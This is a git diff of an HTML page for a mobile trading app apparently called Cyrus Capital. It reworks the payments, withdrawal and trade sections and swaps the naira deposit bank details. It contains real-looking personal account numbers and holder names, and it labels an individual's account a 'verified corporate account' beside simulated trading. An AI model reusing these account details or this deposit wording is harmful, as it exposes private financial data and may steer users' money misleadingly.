 <section id="payments" class="page-section px-4 pt-6 h-full overflow-y-auto">
-    <h2 class="text-xl font-black mb-4">Deposit Funds</h2>
+    <div class="flex justify-between items-center mb-4">
+        <h2 class="text-xl font-black">Payments</h2>
+        <button onclick="switchTab('history')"
+        class="h-10 w-10 bg-white rounded-full shadow-sm flex items-center justify-center text-slate-400">
+        <i class="fa-solid fa-clock-rotate-left"></i>
+    </button>
+    </div>
     <div class="flex gap-2 mb-5">
-        <button id="tab-usd" onclick="switchDepositTab('usd')" class="naira-tab-btn active">USD$ Crypto</button>
-        <button id="tab-naira" onclick="switchDepositTab('naira')" class="naira-tab-btn">NAIRA ₦</button>
+        <button id="pay-tab-deposit" onclick="switchPaymentsView('deposit')" class="naira-tab-btn active">Deposit</button>
+        <button id="pay-tab-withdraw" onclick="switchPaymentsView('withdraw')" class="naira-tab-btn">Withdraw</button>
     </div>
-    <div id="deposit-usd-content">
-    <div id="crypto-loading-box" style="display:none; text-align:center; padding:40px 20px;">
-        <i class="fa-solid fa-spinner fa-spin" style="color:#D4AF37; font-size:32px; margin-bottom:16px; display:block;"></i>
-        <p style="font-weight:800; color:#0f172a; margin-bottom:4px;">Creating Payment...</p>
-        <p style="font-size:12px; color:#94a3b8; font-weight:600;">Please wait</p>
-    </div>
-    <div id="crypto-payment-box" style="display:none; background:white; border-radius:24px; padding:24px; border:2px solid #fbbf24; margin-bottom:20px;">
-        <div style="text-align:center; margin-bottom:16px;">
-            <p style="font-size:10px; font-weight:800; color:#94a3b8; text-transform:uppercase; letter-spacing:0.2em; margin-bottom:4px;">Send exactly this amount</p>
-            <p id="crypto-pay-amount" style="font-size:28px; font-weight:900; color:#0f172a;"></p>
-            <p id="crypto-pay-currency" style="font-size:12px; font-weight:700; color:#D4AF37;"></p>
-        </div>
-        <div style="background:#f8fafc; border-radius:16px; padding:16px; margin-bottom:16px;">
-            <p style="font-size:9px; font-weight:800; color:#94a3b8; text-transform:uppercase; letter-spacing:0.1em; margin-bottom:6px;">Wallet Address</p>
-            <p id="crypto-pay-address" style="font-size:11px; font-weight:700; color:#0f172a; word-break:break-all; font-family:monospace;"></p>
-            <button onclick="copyPayAddress()" style="margin-top:10px; width:100%; padding:10px; background:#D4AF37; color:#0f172a; border:none; border-radius:10px; font-size:11px; font-weight:900; text-transform:uppercase; cursor:pointer;">Copy Address</button>
-        </div>
-        <div style="background:#fef9c3; border-radius:12px; padding:12px; margin-bottom:16px;">
-            <p style="font-size:11px; font-weight:700; color:#854d0e; text-align:center; line-height:1.5;">⚠️ Send <strong>exactly</strong> the amount shown above. Balance credits automatically once confirmed!</p>
-        </div>
-        <p id="crypto-payment-id-display" style="font-size:10px; font-weight:600; color:#94a3b8; text-align:center;"></p>
-        <button onclick="closeCryptoBox()" style="width:100%; padding:12px; background:#f1f5f9; color:#64748b; border:none; border-radius:12px; font-size:11px; font-weight:900; text-transform:uppercase; cursor:pointer; margin-top:8px;">Cancel</button>
-    </div>
-    <div id="crypto-buttons-box">
-        <div style="background:white; border-radius:20px; padding:16px; margin-bottom:16px; border:1px solid #f1f5f9;">
-    <p style="font-size:10px; font-weight:800; color:#94a3b8; text-transform:uppercase; letter-spacing:0.1em; margin-bottom:12px;">Select Crypto Currency</p>
-    <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;" id="currency-selector">
-        <button onclick="selectCurrency('usdttrc20', this)" style="padding:10px; background:#f8fafc; color:#0f172a; border:1px solid #e2e8f0; border-radius:12px; font-size:11px; font-weight:800; cursor:pointer;">USDT TRC20</button>
-        <button onclick="selectCurrency('usdtbsc', this)" style="padding:10px; background:#f8fafc; color:#0f172a; border:1px solid #e2e8f0; border-radius:12px; font-size:11px; font-weight:800; cursor:pointer;">USDT BSC</button>
-        <button onclick="selectCurrency('trx', this)" style="padding:10px; background:#f8fafc; color:#0f172a; border:1px solid #e2e8f0; border-radius:12px; font-size:11px; font-weight:800; cursor:pointer;">TRX</button>
-<button onclick="selectCurrency('sol', this)" style="padding:10px; background:#0f172a; color:white; border:none; border-radius:12px; font-size:11px; font-weight:800; cursor:pointer;">SOL</button>
-        <button onclick="selectCurrency('btc', this)" style="padding:10px; background:#f8fafc; color:#0f172a; border:1px solid #e2e8f0; border-radius:12px; font-size:11px; font-weight:800; cursor:pointer;">BTC</button>
-        <button onclick="selectCurrency('eth', this)" style="padding:10px; background:#f8fafc; color:#0f172a; border:1px solid #e2e8f0; border-radius:12px; font-size:11px; font-weight:800; cursor:pointer;">ETH</button>
-        <button onclick="selectCurrency('bnbbsc', this)" style="padding:10px; background:#f8fafc; color:#0f172a; border:1px solid #e2e8f0; border-radius:12px; font-size:11px; font-weight:800; cursor:pointer;">BNB</button>
-        <button onclick="selectCurrency('ton', this)" style="padding:10px; background:#f8fafc; color:#0f172a; border:1px solid #e2e8f0; border-radius:12px; font-size:11px; font-weight:800; cursor:pointer;">TON</button>
-        <button onclick="selectCurrency('ltc', this)" style="padding:10px; background:#f8fafc; color:#0f172a; border:1px solid #e2e8f0; border-radius:12px; font-size:11px; font-weight:800; cursor:pointer;">LTC</button>
-    </div>
-</div>
-        <div class="mb-4 p-3 bg-blue-50 rounded-2xl border border-blue-100 flex items-start gap-3">
-            <i class="fa-solid fa-circle-info text-blue-400 mt-0.5"></i>
-            <div>
-                <p class="text-xs font-black text-slate-700">Auto Deposit — No Manual Submission!</p>
-                <p class="text-[10px] font-bold text-slate-500">Click any amount. A unique crypto address will be generated for you. Send the exact amount and your balance credits automatically!</p>
-            </div>
-        </div>
-        <div class="bg-white p-5 rounded-[2rem] border border-slate-100 shadow-sm space-y-3 mb-8">
-            <div class="flex items-center justify-between p-3 border-b border-slate-50"><span class="font-bold text-slate-700">$1</span><button onclick="createCryptoPayment(1)" class="bg-yellow-400 text-slate-900 px-4 py-2 rounded-xl font-black text-xs uppercase">Pay $1</button></div>
-            <div class="flex items-center justify-between p-3 border-b border-slate-50"><span class="font-bold text-slate-700">$2</span><button onclick="createCryptoPayment(2)" class="bg-yellow-400 text-slate-900 px-4 py-2 rounded-xl font-black text-xs uppercase">Pay $2</button></div>
-            <div class="flex items-center justify-between p-3 border-b border-slate-50"><span class="font-bold text-slate-700">$4</span><button onclick="createCryptoPayment(4)" class="bg-yellow-400 text-slate-900 px-4 py-2 rounded-xl font-black text-xs uppercase">Pay $4</button></div>
-            <div class="flex items-center justify-between p-3 border-b border-slate-50"><span class="font-bold text-slate-700">$6</span><button onclick="createCryptoPayment(6)" class="bg-yellow-400 text-slate-900 px-4 py-2 rounded-xl font-black text-xs uppercase">Pay $6</button></div>
-            <div class="flex items-center justify-between p-3 border-b border-slate-50"><span class="font-bold text-slate-700">$8</span><button onclick="createCryptoPayment(8)" class="bg-yellow-400 text-slate-900 px-4 py-2 rounded-xl font-black text-xs uppercase">Pay $8</button></div>
-            <div class="flex items-center justify-between p-3 border-b border-slate-50"><span class="font-bold text-slate-700">$10</span><button onclick="createCryptoPayment(10)" class="bg-yellow-400 text-slate-900 px-4 py-2 rounded-xl font-black text-xs uppercase">Pay $10</button></div>
-            <div class="flex items-center justify-between p-3 border-b border-slate-50"><span class="font-bold text-slate-700">$20</span><button onclick="createCryptoPayment(20)" class="bg-yellow-400 text-slate-900 px-4 py-2 rounded-xl font-black text-xs uppercase">Pay $20</button></div>
-            <div class="flex items-center justify-between p-3 border-b border-slate-50"><span class="font-bold text-slate-700">$100</span><button onclick="createCryptoPayment(100)" class="bg-yellow-400 text-slate-900 px-4 py-2 rounded-xl font-black text-xs uppercase">Pay $100</button></div>
-            <div class="flex items-center justify-between p-3"><span class="font-bold text-slate-700">$200</span><button onclick="createCryptoPayment(200)" class="bg-yellow-400 text-slate-900 px-4 py-2 rounded-xl font-black text-xs uppercase">Pay $200</button></div>
-        </div>
-    </div>
-</div>
-<div id="deposit-naira-content" class="hidden">
+
+    <div id="deposit-naira-content">
     <div class="naira-premium-card">
         <div class="naira-premium-card-header">
             <div class="flex items-center gap-3">
@@ -2967,7 +2723,7 @@ class="hidden mb-5 p-4 rounded-2xl border-2 border-yellow-300 bg-yellow-50 flex 
     <div class="naira-premium-card">
         <div class="naira-premium-card-header">
             <h3 class="text-[11px] font-black text-slate-400 uppercase tracking-widest flex items-center gap-2">
-                <i class="fa-solid fa-clock-rotate-left text-slate-400"></i> Deposit History 
+                <i class="fa-solid fa-clock-rotate-left text-slate-400"></i> Deposit History
             </h3>
         </div>
         <div class="naira-premium-card-body" style="padding-top:12px;">
@@ -2980,174 +2736,87 @@ class="hidden mb-5 p-4 rounded-2xl border-2 border-yellow-300 bg-yellow-50 flex 
         <i class="fa-solid fa-shield-halved"></i>
         <div>
             <p class="naira-info-banner-title">Secure Bank Transfer</p>
-            <p class="naira-info-banner-text">Transfer to our verified corporate account. Funds credited instantly or within 1-15 
-            minutes after confirmation.</p>
+            <p class="naira-info-banner-text">Transfer to our verified corporate account, then tap "I Have Paid" and submit your details. Our team reviews and credits deposits manually, usually within 1-24 hours.</p>
         </div>
     </div>
-</div>
+    </div>
+
+    <div id="payments-withdraw-content" class="hidden">
+        <div class="bg-white p-8 rounded-[2.5rem] border border-slate-100 shadow-sm relative mb-10">
+            <h3 class="font-black text-slate-800 mb-6 flex items-center gap-2"><i
+                class="fa-solid fa-building-columns text-slate-400"></i> Naira Payout</h3>
+                <div class="space-y-4">
+                    <div class="bg-slate-50 p-4 rounded-2xl">
+                        <p class="text-[10px] font-black uppercase text-slate-400 mb-1">Amount to withdraw</p>
+                        <input type="number" id="withdraw-input-ngn" placeholder="Enter USD Amount"
+                        class="w-full bg-transparent border-0 font-bold text-lg outline-none"
+                        oninput="updateNairaCalc(this.value)">
+                        <p class="text-[10px] text-slate-500 font-bold mt-2">$1 = N1,350</p>
+                    </div>
+                    <div class="p-4 bg-yellow-50 rounded-2xl flex justify-between items-center">
+                        <span class="text-xs font-black uppercase">Auto-Calc:</span>
+                        <span class="font-mono font-black text-yellow-700" id="naira-display">N0.00</span>
+                    </div>
+                    <div class="relative">
+                        <p class="text-[10px] font-black text-slate-400 uppercase ml-2 mb-1">Bank Account</p>
+                        <input type="text" id="bank-input" onkeyup="filterBanks()" onfocus="showBanks()"
+                        placeholder="Search Nigerian banks..."
+                        class="w-full p-4 bg-slate-50 border-0 rounded-2xl text-sm font-bold focus:ring-2 focus:ring-yellow-400 outline-none">
+                        <div id="bank-list" class="bank-dropdown"></div>
+                    </div>
+                    <div>
+                        <p class="text-[10px] font-black text-slate-400 uppercase ml-2 mb-1">Account Number</p>
+                        <input type="number" id="ngn-acc-num" placeholder="Enter 10-digit number"
+                        class="w-full p-4 bg-slate-50 border-0 rounded-2xl text-sm font-bold focus:ring-2 focus:ring-yellow-400 outline-none">
+                    </div>
+                    <div>
+                        <p class="text-[10px] font-black text-slate-400 uppercase ml-2 mb-1">Account Name</p>
+                        <input type="text" id="ngn-acc-name" placeholder="Full name on account"
+                        class="w-full p-4 bg-slate-50 border-0 rounded-2xl text-sm font-bold focus:ring-2 focus:ring-yellow-400 outline-none">
+                    </div>
+                    <button onclick="checkKycStatus(this)"
+                    class="w-full py-5 bg-slate-900 text-white rounded-2xl font-black text-xs uppercase tracking-widest mt-4 flex items-center justify-center gap-2">
+                    <i class="fa-solid fa-money-bill-1-wave"></i> Withdraw Now
+                </button>
+            </div>
+        </div>
+    </div>
 </section>
 
 <!-- ═══ TRADE SECTION ═══ -->
-<section id="trade" class="page-section px-6 pt-10">
-    <h2 class="text-2xl font-black mb-6">Terminal</h2>
+<section id="trade" class="page-section mt-dark-section">
+<header class="mt-topbar">
+    <button onclick="openDrawer()" class="mt-hamburger"><span></span><span></span><span></span></button>
+    <h1 class="mt-topbar-title">Trade</h1>
+    <button onclick="switchTab('quote')" class="mt-icon-btn" title="All quotes"><i class="fa-solid fa-list"></i></button>
+</header>
 
-    <!-- CLAIM MT5 ACCOUNT PANEL -->
-    <div id="mt5-claim-panel" class="hidden mb-6">
-        <div
-        class="bg-gradient-to-br from-slate-900 to-slate-800 text-white p-8 rounded-[2.5rem] shadow-2xl relative overflow-hidden border border-yellow-400/20">
-        <div class="absolute top-0 right-0 w-32 h-32 bg-yellow-400/5 rounded-full -translate-y-1/2 translate-x-1/2"></div>
-        <div class="relative z-10 text-center">
-            <div class="w-16 h-16 bg-yellow-400/10 rounded-full flex items-center justify-center mx-auto mb-4">
-                <i class="fa-solid fa-server text-yellow-400 text-2xl"></i>
-            </div>
-            <h3 class="text-lg font-black mb-2">No MT5 Account Assigned</h3>
-            <p class="text-xs text-slate-400 font-bold mb-6 max-w-xs mx-auto">Claim your free MT5 trading account to
-            start trading with Cyrus Capital.</p>
-            <button id="claim-mt5-btn" onclick="claimMT5Account()"
-            class="w-full py-5 bg-yellow-400 text-slate-900 rounded-2xl font-black text-sm uppercase tracking-widest shadow-xl active:scale-95 transition-transform flex items-center justify-center gap-2">
-            <i class="fa-solid fa-bolt"></i> Claim MT5 Account
-        </button>
-        <p id="claim-mt5-msg" class="text-[10px] font-bold text-slate-500 mt-3 hidden"></p>
+<div class="mt-symbol-scroller" id="mt-symbol-scroller"></div>
+
+<div class="mt-price-header">
+    <p class="sym" id="mt-trade-sym">EURUSD</p>
+    <p class="name" id="mt-trade-name">Euro vs US Dollar</p>
+</div>
+
+<div class="mt-chart-wrap">
+    <div id="mt-trade-chart" style="height:280px;"></div>
+</div>
+
+<div class="mt-order-bar">
+    <button class="mt-sell-btn" onclick="placeTrade('sell')">
+        <span class="lbl">Sell</span>
+        <span class="px" id="mt-trade-sell-price">--</span>
+    </button>
+    <div class="mt-lots-box">
+        <label>Lots</label>
+        <input type="number" id="mt-trade-lots" value="0.01" step="0.01" min="0.01">
     </div>
-</div>
-</div>
-
-<!-- MT5 CREDENTIALS PANEL -->
-<div id="mt5-credentials-panel">
-    <div class="bg-slate-900 text-white p-8 rounded-[2.5rem] shadow-2xl space-y-6 relative overflow-hidden">
-        <h2 class="text-xs font-black text-yellow-400 uppercase tracking-widest border-b border-slate-800 pb-4">Live
-        MT5 Credentials</h2>
-        <div class="space-y-4">
-            <div class="mt5-credential-row bg-slate-800/50 flex items-center justify-between">
-                <div class="flex-1 min-w-0">
-                    <p class="mt5-credential-label">Login</p>
-                    <p id="mt5-login" class="mt5-credential-value text-white">---</p>
-                </div>
-                <button onclick="copyMT5('login')" class="mt5-copy-btn" title="Copy Login">
-                    <i class="fa-solid fa-copy text-sm"></i> Copy
-                </button>
-            </div>
-            <div class="mt5-credential-row bg-slate-800/50 flex items-center justify-between">
-                <div class="flex-1 min-w-0">
-                    <p class="mt5-credential-label">Password</p>
-                    <p id="mt5-pass-display" class="mt5-credential-value text-white">••••••••</p>
-                </div>
-                <div class="flex gap-2">
-                    <button onclick="toggleMT5Pass()" id="mt5-eye-btn" class="mt5-copy-btn" title="Show/Hide">
-                        <i id="mt5-eye-icon" class="fa-solid fa-eye text-sm"></i>
-                    </button>
-                    <button onclick="copyMT5('pass')" class="mt5-copy-btn" title="Copy Password">
-                        <i class="fa-solid fa-copy text-sm"></i> Copy
-                    </button>
-                </div>
-            </div>
-            <div class="mt5-credential-row bg-slate-800/50 flex items-center justify-between">
-                <div class="flex-1 min-w-0">
-                    <p class="mt5-credential-label">Server</p>
-                    <p id="mt5-server" class="mt5-credential-value text-yellow-400">---</p>
-                </div>
-                <button onclick="copyMT5('server')" class="mt5-copy-btn" title="Copy Server">
-                    <i class="fa-solid fa-copy text-sm"></i> Copy
-                </button>
-            </div>
-        </div>
-    </div>
-</div>
-<!-- TRADE NOW BUTTON -->
-<div class="mt-6">
-    <button onclick="openMT5Terminal()"
-    class="w-full py-5 bg-gradient-to-r from-[#D4AF37] to-[#B8860B] text-slate-900 rounded-2xl font-black text-sm uppercase tracking-widest shadow-xl active:scale-95 transition-transform flex items-center justify-center gap-3 border-2 border-yellow-300">
-        <i class="fa-solid fa-chart-candlestick text-xl"></i> Trade Now
+    <button class="mt-buy-btn" onclick="placeTrade('buy')">
+        <span class="lbl">Buy</span>
+        <span class="px" id="mt-trade-buy-price">--</span>
     </button>
-    <p class="text-[10px] font-bold text-slate-400 text-center mt-2 uppercase tracking-wider">MT5 Web Terminal</p>
 </div>
-<!-- LEADERBOARD BUTTON -->
-<div class="mt-6">
-    <button onclick="openLeaderboard()"
-    class="w-full py-5 bg-gradient-to-r from-yellow-400 to-yellow-500 text-slate-900 rounded-2xl font-black text-sm uppercase tracking-widest shadow-xl active:scale-95 transition-transform flex items-center justify-center gap-3 border-2 border-yellow-300">
-    <span class="text-xl">🏆</span> Leaderboard
-</button>
-<p class="text-[10px] font-bold text-slate-400 text-center mt-2 uppercase tracking-wider">Weekly Profit Rankings</p>
-</div>
-
-<!-- PNL BUTTON -->
-<div class="mt-4">
-    <button onclick="openPNL()"
-    class="w-full py-5 bg-white text-slate-900 rounded-2xl font-black text-sm uppercase tracking-widest shadow-xl active:scale-95 transition-transform flex items-center justify-center gap-3 border-2 border-slate-100">
-        <i class="fa-solid fa-chart-mixed text-green-500 text-xl"></i> Cyrus Capital PNL
-    </button>
-    <p class="text-[10px] font-bold text-slate-400 text-center mt-2 uppercase tracking-wider">Profit & Loss Report</p>
-</div>
-<!-- TRADING JOURNAL BUTTON -->
-<div class="mt-4">
-    <button onclick="openJournal()"
-    class="w-full py-5 bg-white text-slate-900 rounded-2xl font-black text-sm uppercase tracking-widest shadow-xl active:scale-95 transition-transform flex items-center justify-center gap-3 border-2 border-slate-100">
-        <i class="fa-solid fa-book-open text-yellow-500 text-xl"></i> Trading Journal
-    </button>
-    <p class="text-[10px] font-bold text-slate-400 text-center mt-2 uppercase tracking-wider">Log & track your trades</p>
-</div>
-<!-- MT5 PASSWORD CHANGE GUIDE BUTTON -->
-<div class="mt-4 mb-10">
-    <button onclick="openMT5PassGuide()"
-    class="w-full py-5 bg-gradient-to-r from-yellow-400 to-yellow-500 text-slate-900 rounded-2xl font-black text-sm uppercase tracking-widest shadow-xl active:scale-95 transition-transform flex items-center justify-center gap-3 border-2 border-yellow-300 hover:shadow-2xl">
-        <i class="fa-solid fa-key text-slate-900 text-xl"></i> Change MT5 Password
-    </button>
-    <p class="text-[10px] font-bold text-slate-400 text-center mt-2 uppercase tracking-wider">3-step visual guide</p>
-</div>
-
-</section>
-
-<!-- ═══ AI ANALYZER SECTION ═══ -->
-<section id="analyzer" class="page-section">
-    <div class="analyzer-body min-h-screen">
-        <nav class="top-nav">
-            <div class="flex items-center gap-2">
-                <i class="fa-solid fa-crown text-yellow-400 text-2xl"></i>
-                <span class="font-black text-xl text-slate-900 uppercase">Cyrus AI</span>
-            </div>
-        </nav>
-        <div class="main-header">
-            <h1>Screenshot Analyzer</h1>
-            <p class="text-slate-500 font-medium">Upload any trading screenshot for instant AI analysis.</p>
-        </div>
-        <div class="upload-container">
-            <div id="upload-trigger" class="upload-box">
-                <i class="fa-solid fa-camera text-3xl text-slate-300 mb-3"></i>
-                <p id="status-text" class="font-bold text-slate-800">Tap to Upload Screenshot</p>
-                <input type="file" id="file-input" class="hidden" accept="image/*">
-            </div>
-            <div class="mt-4 mb-2">
-                <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-2 text-center">Analysis
-                Mode</p>
-                <div class="flex gap-2 justify-center flex-wrap">
-                    <button class="analysis-mode-btn active px-4 py-2 bg-slate-900 text-white rounded-xl text-[10px] font-black uppercase tracking-wider"
-                    data-mode="sr">S&R Zones</button>
-                    <button class="analysis-mode-btn px-4 py-2 bg-white text-slate-400 border border-slate-200 rounded-xl text-[10px] font-black uppercase tracking-wider"
-                    data-mode="pattern">Pattern</button>
-                    <button class="analysis-mode-btn px-4 py-2 bg-white text-slate-400 border border-slate-200 rounded-xl text-[10px] font-black uppercase tracking-wider"
-                    data-mode="sentiment">Sentiment</button>
-                    <button class="analysis-mode-btn px-4 py-2 bg-white text-slate-400 border border-slate-200 rounded-xl text-[10px] font-black uppercase tracking-wider"
-                    data-mode="full">Full</button>
-                </div>
-            </div>
-            <button id="run-btn" class="analyze-btn mt-4" disabled>Analyze Screenshot</button>
-        </div>
-        <div id="result-overlay">
-            <div id="output-card">
-                <button onclick="closeModal()" class="absolute top-5 right-5 text-slate-300 hover:text-red-500">
-                    <i class="fa-solid fa-circle-xmark text-2xl"></i>
-                </button>
-                <div id="ai-result"></div>
-            </div>
-        </div>
-        <div class="upload-container mt-8">
-            <div class="flex justify-between items-center mb-3">
-                <h3 class="text-xs font-black text-slate-400 uppercase tracking-widest">Recent Analyses</h3>
-                <button onclick="clearAnalyzerHistory()" class="text-[10px] font-bold text-red-400 uppercase">Clear</button>
-            </div>
-            <div id="analyzer-history-list" class="space-y-3"></div>
-        </div>
-    </div>
+<p class="mt-order-note">Simulated trading against live market prices. P&amp;L settles to your balance on close.</p>
 </section>
 
 <!-- ═══ KYC / PROFILE SECTION ═══ -->
@@ -3303,30 +2972,30 @@ class="hidden mb-5 p-4 rounded-2xl border-2 border-yellow-300 bg-yellow-50 flex 
             <span style="font-size:9px; font-weight:800; color:#D4AF37; text-transform:uppercase; letter-spacing:0.08em;">Home</span>
             <div class="nav-gold-line" style="position:absolute; bottom:-2px; left:25%; right:25%; height:2.5px; background:linear-gradient(90deg,#D4AF37,#f5c842); border-radius:2px; opacity:1;"></div>
         </button>
-        <button onclick="switchTab('payments'); setActiveNav(this)" class="glass-nav-item" style="flex:1; display:flex; flex-direction:column; align-items:center; gap:4px; background:none; border:none; cursor:pointer; padding:6px 4px; position:relative;">
-            <i class="fa-solid fa-credit-card" style="font-size:20px; color:#94a3b8;"></i>
-            <span style="font-size:9px; font-weight:800; color:#94a3b8; text-transform:uppercase; letter-spacing:0.08em;">Payment</span>
-            <div class="nav-gold-line" style="position:absolute; bottom:-2px; left:25%; right:25%; height:2.5px; background:linear-gradient(90deg,#D4AF37,#f5c842); border-radius:2px; opacity:0;"></div>
-        </button>
-        <button onclick="switchTab('analyzer'); setActiveNav(this)" class="glass-nav-item" style="flex:1; display:flex; flex-direction:column; align-items:center; gap:4px; background:none; border:none; cursor:pointer; padding:0; position:relative; margin-top:-18px;">
-            <div style="width:52px; height:52px; border-radius:18px; background:linear-gradient(135deg,#D4AF37,#B8860B); display:flex; align-items:center; justify-content:center; box-shadow:0 4px 20px rgba(212,175,55,0.45), 0 0 0 3px rgba(212,175,55,0.15);">
-                <i class="fa-solid fa-crown" style="color:white; font-size:22px;"></i>
-            </div>
-            <span style="font-size:9px; font-weight:800; color:#94a3b8; text-transform:uppercase; letter-spacing:0.08em; margin-top:2px;">AI</span>
-            <div class="nav-gold-line" style="position:absolute; bottom:-2px; left:25%; right:25%; height:2.5px; background:linear-gradient(90deg,#D4AF37,#f5c842); border-radius:2px; opacity:0;"></div>
-        </button>
         <button onclick="switchTab('trade'); setActiveNav(this)" class="glass-nav-item" style="flex:1; display:flex; flex-direction:column; align-items:center; gap:4px; background:none; border:none; cursor:pointer; padding:6px 4px; position:relative;">
             <i class="fa-solid fa-chart-line" style="font-size:20px; color:#94a3b8;"></i>
             <span style="font-size:9px; font-weight:800; color:#94a3b8; text-transform:uppercase; letter-spacing:0.08em;">Trade</span>
             <div class="nav-gold-line" style="position:absolute; bottom:-2px; left:25%; right:25%; height:2.5px; background:linear-gradient(90deg,#D4AF37,#f5c842); border-radius:2px; opacity:0;"></div>
         </button>
-        <button onclick="switchTab('withdrawal'); setActiveNav(this)" class="glass-nav-item" style="flex:1; display:flex; flex-direction:column; align-items:center; gap:4px; background:none; border:none; cursor:pointer; padding:6px 4px; position:relative;">
-            <i class="fa-solid fa-money-bill-transfer" style="font-size:20px; color:#94a3b8;"></i>
-            <span style="font-size:9px; font-weight:800; color:#94a3b8; text-transform:uppercase; letter-spacing:0.08em;">Withdraw</span>
+        <button onclick="switchTab('history'); setActiveNav(this)" class="glass-nav-item" style="flex:1; display:flex; flex-direction:column; align-items:center; gap:4px; background:none; border:none; cursor:pointer; padding:6px 4px; position:relative;">
+            <i class="fa-solid fa-clock-rotate-left" style="font-size:20px; color:#94a3b8;"></i>
+            <span style="font-size:9px; font-weight:800; color:#94a3b8; text-transform:uppercase; letter-spacing:0.08em;">History</span>
+            <div class="nav-gold-line" style="position:absolute; bottom:-2px; left:25%; right:25%; height:2.5px; background:linear-gradient(90deg,#D4AF37,#f5c842); border-radius:2px; opacity:0;"></div>
+        </button>
+        <button onclick="switchTab('quote'); setActiveNav(this)" class="glass-nav-item" style="flex:1; display:flex; flex-direction:column; align-items:center; gap:4px; background:none; border:none; cursor:pointer; padding:6px 4px; position:relative;">
+            <i class="fa-solid fa-list" style="font-size:20px; color:#94a3b8;"></i>
+            <span style="font-size:9px; font-weight:800; color:#94a3b8; text-transform:uppercase; letter-spacing:0.08em;">Quote</span>
+            <div class="nav-gold-line" style="position:absolute; bottom:-2px; left:25%; right:25%; height:2.5px; background:linear-gradient(90deg,#D4AF37,#f5c842); border-radius:2px; opacity:0;"></div>
+        </button>
+        <button onclick="switchTab('payments'); setActiveNav(this)" class="glass-nav-item" style="flex:1; display:flex; flex-direction:column; align-items:center; gap:4px; background:none; border:none; cursor:pointer; padding:6px 4px; position:relative;">
+            <i class="fa-solid fa-credit-card" style="font-size:20px; color:#94a3b8;"></i>
+            <span style="font-size:9px; font-weight:800; color:#94a3b8; text-transform:uppercase; letter-spacing:0.08em;">Payments</span>
             <div class="nav-gold-line" style="position:absolute; bottom:-2px; left:25%; right:25%; height:2.5px; background:linear-gradient(90deg,#D4AF37,#f5c842); border-radius:2px; opacity:0;"></div>
         </button>
     </nav>
 </footer>
+
+<!-- TRADE MODAL (chart + buy/sell) -->
 <!-- PARTNER LEVEL MODAL -->
 <div id="partner-modal" class="modal-overlay" style="display:none;">
     <div class="modal-card" style="max-width:440px;max-height:94vh;overflow-y:auto;padding:0;border:3px solid rgba(212,175,55,0.3);">
@@ -3519,13 +3188,6 @@ class="hidden mb-5 p-4 rounded-2xl border-2 border-yellow-300 bg-yellow-50 flex 
         <i class="fa-brands fa-telegram"></i> Telegram Support
     </a>
 </div>
-                <!-- DASHBOARD SUPPORT WIDGET -->
-                <div class="dashboard-support-widget" id="dashboard-support-widget">
-                    <div class="support-widget-pulse"></div>
-                    <button class="support-widget-btn" onclick="openDashboardSupportModal()" title="Customer Support">
-                        <i class="fa-solid fa-headset"></i>
-                    </button>
-                </div>
 
                 <!-- NAIRA BANK DETAILS MODAL -->
                 <div id="naira-bank-modal" class="modal-overlay">
@@ -3544,25 +3206,25 @@ class="hidden mb-5 p-4 rounded-2xl border-2 border-yellow-300 bg-yellow-50 flex 
                             <div class="naira-bank-detail-card">
                                 <div class="naira-bank-detail-info">
                                     <p class="naira-bank-detail-label">Bank Name</p>
-                                    <p class="naira-bank-detail-value">Palmpay Limited</p>
+                                    <p class="naira-bank-detail-value">Opay</p>
                                 </div>
-                                <button onclick="copyNairaDetail('Palmpay Limited')" class="naira-copy-btn"><i
+                                <button onclick="copyNairaDetail('Opay')" class="naira-copy-btn"><i
                                 class="fa-solid fa-copy"></i> Copy</button>
                             </div>
                             <div class="naira-bank-detail-card">
                                 <div class="naira-bank-detail-info">
                                     <p class="naira-bank-detail-label">Account Number</p>
-                                    <p id="naira-bank-acc-num" class="naira-bank-detail-value">6685215756</p>
+                                    <p id="naira-bank-acc-num" class="naira-bank-detail-value">8037912766</p>
                                 </div>
-                                <button onclick="copyNairaDetail('6685215756')" class="naira-copy-btn"><i
+                                <button onclick="copyNairaDetail('8037912766')" class="naira-copy-btn"><i
                                 class="fa-solid fa-copy"></i> Copy</button>
                             </div>
                             <div class="naira-bank-detail-card">
                                 <div class="naira-bank-detail-info">
                                     <p class="naira-bank-detail-label">Account Name</p>
-                                    <p class="naira-bank-detail-value">IDOWU AWE(VistaPay)</p>
+                                    <p class="naira-bank-detail-value">CHINEDU EMMANUEL</p>
                                 </div>
-                                <button onclick="copyNairaDetail('IDOWU AWE(VistaPay) Awe')" class="naira-copy-btn"><i
+                                <button onclick="copyNairaDetail('CHINEDU EMMANUEL')" class="naira-copy-btn"><i
                                 class="fa-solid fa-copy"></i> Copy</button>
                             </div>
                             <div class="naira-summary-box">
@@ -3699,40 +3361,8 @@ class="hidden mb-5 p-4 rounded-2xl border-2 border-yellow-300 bg-yellow-50 flex 
         <button onclick="filterJournal('sell', this)" id="jfilter-sell" style="padding:8px 16px; border-radius:20px; font-size:10px; font-weight:800; border:2px solid #e2e8f0; background:white; color:#94a3b8; cursor:pointer; white-space:nowrap; transition:all 0.2s;">Sell 📉</button>
     </div>
 
-    <!-- Live Trading Terminal -->
-    <div id="live-trade-section" style="flex:1; display:flex; flex-direction:column; overflow:hidden;">
-        <!-- Pair Selector -->
-        <div style="padding:16px 20px; border-bottom:1px solid #f1f5f9; background:white;">
-            <div style="display:flex; gap:8px; overflow-x:auto; padding-bottom:8px;">
-                <button onclick="selectLivePair('EUR/USD')" class="pair-btn-live" style="padding:8px 14px; background:#f8fafc; border:2px solid #e2e8f0; border-radius:10px; font-size:11px; font-weight:800; cursor:pointer; white-space:nowrap; flex-shrink:0;">EURUSD</button>
-                <button onclick="selectLivePair('GBP/USD')" class="pair-btn-live" style="padding:8px 14px; background:#f8fafc; border:2px solid #e2e8f0; border-radius:10px; font-size:11px; font-weight:800; cursor:pointer; white-space:nowrap; flex-shrink:0;">GBPUSD</button>
-                <button onclick="selectLivePair('USD/JPY')" class="pair-btn-live" style="padding:8px 14px; background:#f8fafc; border:2px solid #e2e8f0; border-radius:10px; font-size:11px; font-weight:800; cursor:pointer; white-space:nowrap; flex-shrink:0;">USDJPY</button>
